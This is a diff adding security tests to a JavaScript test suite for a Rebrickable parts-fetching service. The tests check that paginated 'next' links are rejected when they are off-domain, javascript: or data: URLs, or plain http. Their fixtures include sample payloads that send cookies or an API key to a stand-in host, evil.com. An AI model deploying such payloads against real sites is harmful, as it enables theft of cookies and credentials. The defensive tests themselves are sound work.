@@ -356,5 +356,62 @@ describe('Rebrickable Service', () => {
       mockFetch.mockRejectedValueOnce(new Error('Network error'));
       expect(await fetchPartsForInventory('75313-1', null)).toEqual([]);
     });
+
+    // SEC-R005: off-domain `page.next` must not be fetched
+    it('does not follow page.next pointing to an off-domain URL', async () => {
+      mockFetch.mockResolvedValueOnce({
+        ok: true, status: 200, headers: { get: () => null },
+        json: async () => ({
+          count: 2,
+          next: 'https://evil.com/steal-your-api-key',
+          results: [{ part: { part_num: '3001', name: 'Brick 2x4', part_img_url: '' }, color: { name: 'Red' }, quantity: 1, is_spare: false }],
+        }),
+      });
+      const parts = await fetchPartsForInventory('75313-1', null);
+      expect(parts).toHaveLength(1);
+      expect(mockFetch).toHaveBeenCalledTimes(1);
+    });
+
+    it('does not follow page.next with a javascript: URL', async () => {
+      mockFetch.mockResolvedValueOnce({
+        ok: true, status: 200, headers: { get: () => null },
+        json: async () => ({
+          count: 1,
+          next: 'javascript:fetch("https://evil.com/?key="+document.cookie)',
+          results: [{ part: { part_num: '3002', name: 'Plate 1x2', part_img_url: '' }, color: { name: 'Blue' }, quantity: 4, is_spare: false }],
+        }),
+      });
+      const parts = await fetchPartsForInventory('75313-1', null);
+      expect(parts).toHaveLength(1);
+      expect(mockFetch).toHaveBeenCalledTimes(1);
+    });
+
+    it('does not follow page.next with a data: URI', async () => {
+      mockFetch.mockResolvedValueOnce({
+        ok: true, status: 200, headers: { get: () => null },
+        json: async () => ({
+          count: 1,
+          next: 'data:text/html,<script>fetch("https://evil.com")</script>',
+          results: [{ part: { part_num: '3003', name: 'Tile 2x2', part_img_url: '' }, color: { name: 'White' }, quantity: 2, is_spare: true }],
+        }),
+      });
+      const parts = await fetchPartsForInventory('75313-1', null);
+      expect(parts).toHaveLength(1);
+      expect(mockFetch).toHaveBeenCalledTimes(1);
+    });
+
+    it('does not follow page.next that uses http:// (protocol downgrade)', async () => {
+      mockFetch.mockResolvedValueOnce({
+        ok: true, status: 200, headers: { get: () => null },
+        json: async () => ({
+          count: 1,
+          next: 'http://rebrickable.com/api/v3/lego/sets/75313-1/parts/?page=2',
+          results: [{ part: { part_num: '3004', name: 'Slope', part_img_url: '' }, color: { name: 'Yellow' }, quantity: 3, is_spare: false }],
+        }),
+      });
+      const parts = await fetchPartsForInventory('75313-1', null);
+      expect(parts).toHaveLength(1);
+      expect(mockFetch).toHaveBeenCalledTimes(1);
+    });
   });
 });
